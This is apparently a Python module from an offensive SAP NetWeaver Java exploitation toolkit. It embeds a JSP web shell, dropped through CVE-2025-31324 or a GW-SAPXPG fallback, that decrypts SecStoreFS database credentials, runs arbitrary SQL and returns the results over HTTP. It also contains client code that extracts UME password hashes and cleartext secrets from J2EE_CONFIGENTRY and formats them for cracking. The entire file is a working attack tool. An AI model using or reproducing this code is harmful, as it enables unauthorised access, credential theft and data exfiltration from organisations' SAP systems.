#!/usr/bin/env python3
"""
SAP Java direct DB access via dropped JSP.

Reuses the SecStoreFS-decrypted `jdbc/pool/<SID>` credentials to open a
JDBC connection from inside the J2EE container, run a SELECT, and stream
results back over HTTP.  Two callers:

  - download_jdbc_query(node, query, max_rows) — generic SELECT runner
  - extract_password_hashes(node, max_users)   — UME_STRINGS j_user/j_password
                                                  pairs in a hashcat-friendly
                                                  format

The JSP is dropped via the same chunked-write helper used for the secstore
JSP; identical CVE-2025-31324 / GW-SAPXPG fallback chain.
"""

from __future__ import annotations

import base64
import csv
import io
import logging
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request

logger = logging.getLogger(__name__)

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")


# ---------------------------------------------------------------------------
# JSP template — runs an arbitrary SELECT via the SecStoreFS-extracted
# jdbc/pool/<SID> credentials.  Result emitted as one CSV-encoded line per
# row, prefixed by a header line listing column names.
# ---------------------------------------------------------------------------
JDBC_QUERY_JSP = r'''<%@ page contentType="text/plain" %>
<%
String sid = request.getParameter("sid");
String b64query = request.getParameter("query");
String maxRowsS = request.getParameter("max_rows");
if (sid == null || sid.length() == 0 || b64query == null) {
    out.println("status=error"); out.println("error=missing-sid-or-query"); return;
}
sid = sid.toUpperCase();
String query = new String(java.util.Base64.getDecoder().decode(b64query), "UTF-8");
int maxRows = 500;
try { if (maxRowsS != null) maxRows = Integer.parseInt(maxRowsS); } catch (Exception e) {}

String pp = "/".equals(System.getProperty("file.separator"))
    ? "/usr/sap/" + sid + "/SYS/global/security/data/SecStore.properties"
    : "C:\\usr\\sap\\" + sid + "\\SYS\\global\\security\\data\\SecStore.properties";
String kp = "/".equals(System.getProperty("file.separator"))
    ? "/usr/sap/" + sid + "/SYS/global/security/data/SecStore.key"
    : "C:\\usr\\sap\\" + sid + "\\SYS\\global\\security\\data\\SecStore.key";

java.sql.Connection conn = null;
try {
    Class<?> SSF = Class.forName("com.sap.security.core.server.secstorefs.SecStoreFS");
    SSF.getMethod("setDefaultFilenames", String.class, String.class).invoke(null, pp, kp);
    try { SSF.getMethod("setSID", String.class).invoke(null, sid); } catch (Exception e) {}
    java.lang.reflect.Constructor<?> ctor = null;
    for (java.lang.reflect.Constructor<?> c : SSF.getDeclaredConstructors())
        if (c.getParameterTypes().length == 0) { ctor = c; ctor.setAccessible(true); break; }
    Object inst = ctor.newInstance();
    SSF.getMethod("setFilenames", String.class, String.class).invoke(inst, pp, kp);
    SSF.getMethod("openExistingStore").invoke(inst);
    java.util.Properties pairs = (java.util.Properties)
        SSF.getMethod("getStringPairs").invoke(inst);

    String jdbcVal = null;
    for (String n : pairs.stringPropertyNames()) {
        if (n.toLowerCase().startsWith("jdbc/pool/")) {
            jdbcVal = pairs.getProperty(n); break;
        }
    }
    if (jdbcVal == null) {
        out.println("status=error"); out.println("error=no-jdbc-pool-entry"); return;
    }
    String cleaned = jdbcVal.replace("\\", "");
    java.util.regex.Matcher m;
    m = java.util.regex.Pattern.compile("ClassName\\s*=\\s*([A-Za-z0-9_.]+)").matcher(cleaned);
    String drv = m.find() ? m.group(1) : null;
    m = java.util.regex.Pattern.compile("Url\\s*=\\s*(jdbc:[^&;]+)").matcher(cleaned);
    String url = m.find() ? m.group(1).trim() : null;
    m = java.util.regex.Pattern.compile("[?&;]User\\s*=\\s*([^&;]+)",
        java.util.regex.Pattern.CASE_INSENSITIVE).matcher(cleaned);
    String usr = m.find() ? m.group(1).trim() : null;
    m = java.util.regex.Pattern.compile("[?&;]Password\\s*=\\s*([^&;]*)",
        java.util.regex.Pattern.CASE_INSENSITIVE).matcher(cleaned);
    String pwd = m.find() ? m.group(1).trim() : "";

    if (drv != null) Class.forName(drv);
    conn = java.sql.DriverManager.getConnection(url, usr, pwd);
    java.sql.PreparedStatement ps = conn.prepareStatement(query);
    ps.setMaxRows(maxRows);
    java.sql.ResultSet rs = ps.executeQuery();
    java.sql.ResultSetMetaData md = rs.getMetaData();
    int n = md.getColumnCount();
    out.println("### COLUMNS");
    StringBuilder hdr = new StringBuilder();
    for (int i = 1; i <= n; i++) {
        if (i > 1) hdr.append(",");
        hdr.append(md.getColumnLabel(i));
    }
    out.println(hdr.toString());
    out.println("### ROWS");
    int rowCount = 0;
    while (rs.next() && rowCount < maxRows) {
        StringBuilder line = new StringBuilder();
        for (int i = 1; i <= n; i++) {
            if (i > 1) line.append("|");
            String v = rs.getString(i);
            if (v == null) v = "";
            // Replace pipes / newlines so the field-separator survives;
            // caller restores by base64-decoding each field.
            byte[] vb = v.getBytes("UTF-8");
            line.append(java.util.Base64.getEncoder().encodeToString(vb));
        }
        out.println(line.toString());
        rowCount++;
    }
    rs.close(); ps.close();
    out.println("### END row_count=" + rowCount);
} catch (Throwable t) {
    Throwable c = t;
    while (c.getCause() != null) c = c.getCause();
    out.println("status=error");
    out.println("error=" + c.getClass().getSimpleName() + ": " + c.getMessage());
} finally {
    if (conn != null) try { conn.close(); } catch (Exception e) {}
}
%>'''


# ---------------------------------------------------------------------------
# JSP invoker + parser
# ---------------------------------------------------------------------------

def invoke_jdbc_query(jsp_url: str, sid: str, query: str,
                       max_rows: int = 500, timeout: float = 60.0) -> dict:
    """POST a SELECT to the deployed JSP, return parsed rows.

    Returns dict {success, columns, rows, row_count, error, raw}.
    Each cell in `rows` is the raw UTF-8 string (already base64-decoded).
    """
    qb64 = base64.b64encode(query.encode("utf-8")).decode("ascii")
    body = urllib.parse.urlencode({
        "sid": sid, "query": qb64, "max_rows": str(max_rows)}).encode()
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(
        jsp_url, data=body,
        headers={"User-Agent": _UA,
                 "Content-Type": "application/x-www-form-urlencoded"})
    result = {"success": False, "columns": [], "rows": [],
              "row_count": 0, "error": "", "raw": ""}
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            text = r.read().decode("latin1", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("latin1", errors="replace")
        except Exception:
            text = ""
        result["error"] = f"HTTP {e.code}"
        result["raw"] = text[:500]
        return result
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        result["error"] = str(e)
        return result

    result["raw"] = text
    section = None
    for line in text.splitlines():
        if line == "### COLUMNS": section = "cols"; continue
        if line == "### ROWS":    section = "rows"; continue
        if line.startswith("### END"):
            m = re.search(r"row_count=(\d+)", line)
            if m: result["row_count"] = int(m.group(1))
            section = None
            result["success"] = True
            continue
        if section is None:
            if line.startswith("error="):
                result["error"] = (result["error"] + " / " if result["error"]
                                    else "") + line[len("error="):]
            continue
        if section == "cols":
            result["columns"] = [c.strip() for c in line.split(",")]
        elif section == "rows":
            cells = []
            for b64 in line.split("|"):
                try:
                    cells.append(base64.b64decode(b64).decode("utf-8",
                                                                errors="replace"))
                except Exception:
                    cells.append("")
            result["rows"].append(cells)
    return result


# ---------------------------------------------------------------------------
# UME password hash extraction
# ---------------------------------------------------------------------------

# Direct query for j_password rows.  The username is encoded in the PID
# column as `UACC.PRIVATE_DATASOURCE.un:<USERNAME>` — we parse it client-side
# in parse_password_hashes() rather than join in SQL.  Simpler than the
# self-join we previously used and works reliably across UME schema versions.
UME_HASH_QUERY = (
    "SELECT PID, VAL FROM UME_STRINGS WHERE ATTR LIKE '%j_password%'"
)

# J2EE_CONFIGENTRY rows whose NAME suggests a credential.  These are already
# decrypted by extract_java_secstore, but the password-extraction workflow
# needs them surfaced alongside the UME hashes so a single output file
# contains every recoverable secret on the system.
CONFIGENTRY_PASSWORD_QUERY = (
    "SELECT CID, NAME, VBYTES FROM J2EE_CONFIGENTRY "
    "WHERE VBYTES IS NOT NULL "
    "AND NAME NOT LIKE '##%' "
    "AND ("
    "  LOWER(NAME) LIKE '%pass%' OR LOWER(NAME) LIKE '%pwd%' OR "
    "  LOWER(NAME) LIKE '%secret%' OR LOWER(NAME) LIKE '%credential%' OR "
    "  LOWER(NAME) LIKE '%key%'"
    ")"
)


def parse_password_hashes(query_result: dict) -> list:
    """Convert a `download_jdbc_query` result into hash records.

    Returns list of dicts: {username, hash, algorithm, iterations, salt_b64}.
    """
    hashes = []
    cols = [c.upper() for c in query_result.get("columns", [])]
    # Two accepted shapes:
    #   1. (USERNAME, HASH)            — from older self-joined query
    #   2. (PID, VAL)                  — from `SELECT PID, VAL FROM
    #                                     UME_STRINGS WHERE ATTR LIKE
    #                                     '%j_password%'` — username is
    #                                     embedded in PID (last segment
    #                                     after the final colon)
    if "USERNAME" in cols and "HASH" in cols:
        u_idx, h_idx = cols.index("USERNAME"), cols.index("HASH")
        pid_idx = -1
    elif "PID" in cols and "VAL" in cols:
        pid_idx = cols.index("PID")
        h_idx   = cols.index("VAL")
        u_idx   = -1
    else:
        return hashes
    for row in query_result.get("rows", []):
        if len(row) <= max(h_idx, max(u_idx, pid_idx)):
            continue
        if pid_idx >= 0:
            pid = row[pid_idx] or ""
            # PID like "UACC.PRIVATE_DATASOURCE.un:Administrator"
            username = pid.rsplit(":", 1)[-1] if ":" in pid else pid
        else:
            username = row[u_idx]
        full_hash = row[h_idx] or ""
        m = re.match(r"^\{([A-Za-z0-9\-]+)\s*,\s*(\d+)\s*,\s*(\d+)\}(.+)$",
                      full_hash.strip())
        if m:
            algorithm = m.group(1)
            iterations = int(m.group(2))
            salt_len = int(m.group(3))
            try:
                blob = base64.b64decode(m.group(4))
            except Exception:
                blob = b""
            digest_size = {"SHA-256": 32, "SHA-512": 64}.get(algorithm, 32)
            stored_hash = blob[:digest_size]
            salt = blob[digest_size:digest_size + salt_len]
            hashes.append({
                "username": username,
                "hash": full_hash,
                "algorithm": algorithm,
                "iterations": iterations,
                "salt_b64": base64.b64encode(salt).decode("ascii"),
                "hash_b64": base64.b64encode(stored_hash).decode("ascii"),
            })
        else:
            # Unrecognised format — surface as-is so the caller still sees
            # the username/hash pair.
            hashes.append({
                "username": username, "hash": full_hash,
                "algorithm": "unknown", "iterations": 0,
                "salt_b64": "", "hash_b64": "",
            })
    return hashes


def hashes_to_text(hashes: list, configentry_secrets: list = None) -> str:
    """Render hash records + cleartext config-entry secrets as one text file.

    UME hashes go under a header that documents the iteration algorithm so a
    cracker (or human) knows what they're looking at.  J2EE_CONFIGENTRY
    secrets — already decrypted to cleartext by SecStoreFS — are listed
    underneath in `cid::name:value` form for easy review.
    """
    lines = [
        "# SAP Java password material",
        "#",
        "# Section 1: UME user hashes (UME_STRINGS j_user/j_password pairs)",
        "# Format: username:{ALGORITHM, ITERATIONS, SALT_LEN}base64(hash || salt)",
        "# Algorithm: digest = SHA-N(password + salt); for i in range(iterations - 1):",
        "#                       digest = SHA-N(password + digest)",
        "# Use sap_java_secstore.ume_password_check(stored_hash, candidate) for cracking,",
        "# or rebuild via sap_java_secstore.ume_password_hash(candidate, salt=...).",
        "",
    ]
    if hashes:
        for h in hashes:
            lines.append(f"{h['username']}:{h['hash']}")
    else:
        lines.append("# (no UME hashes recovered)")
    lines.append("")
    if configentry_secrets:
        lines.append("# Section 2: cleartext password-like entries from "
                      "J2EE_CONFIGENTRY")
        lines.append("# Format: cid::name=value   (already decrypted via SecStoreFS)")
        lines.append("")
        for s in configentry_secrets:
            v = s.get("value", "")
            # Single-line presentation; keep newlines visible as \n
            v = v.replace("\\", "\\\\").replace("\n", "\\n")
            lines.append(f"{s.get('cid', '')}::{s.get('name', '')}={v}")
    return "\n".join(lines) + "\n"
